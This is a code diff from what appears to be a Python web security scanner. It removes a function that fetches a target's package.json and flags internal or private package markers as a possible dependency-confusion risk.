+    return {"scenario_id": scenario.id, "attack_type": "replay_check", "passed": not issues, "details": issues, "artifacts": artifacts}
 
-def run_dependency_confusion_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Dependency Confusion: Checking for private packages in public registries."""
-    # This usually scans package.json if available
-    resp = client.send("GET", "/package.json")
-    issues = []
-    if resp.status_code == 200:
-        if "@internal" in resp.text or '"private": true' in resp.text:
-             issues.append("Potential Dependency Confusion risk found in package.json")
-    return {"scenario_id": scenario.id, "attack_type": "dependency_confusion", "passed": not issues, "details": issues}
